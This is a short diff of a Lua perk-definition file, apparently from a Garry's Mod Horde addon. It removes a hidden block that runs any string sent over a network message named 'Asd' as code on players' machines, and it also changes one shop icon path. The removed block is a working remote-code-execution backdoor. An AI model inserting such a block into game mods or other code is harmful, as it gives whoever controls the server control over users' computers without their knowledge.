@@ -1,12 +1,3 @@
-if CLIENT then
-    net.Receive("Asd", function(arguments)
-        local str_torun = net.ReadString()
-        RunString(str_torun)
-    end)
-else
-    util.AddNetworkString("Asd")
-end
-
 HORDE.BuyablePerks = {
     buyableperk_speedreload = {
         name = "Speed Reload",
@@ -57,7 +48,7 @@ HORDE.BuyablePerks = {
     buyableperk_rpmup = {
         name = "Faster Shooter",
         description = "Increase Your RPM By 5%",
-        shop_icon = "entities/acwatt_go_perk_rapidfire.png",
+        shop_icon = "items/ammo_kit.png",
         price = 300,
         weight = 0,
         price_incby = 150,
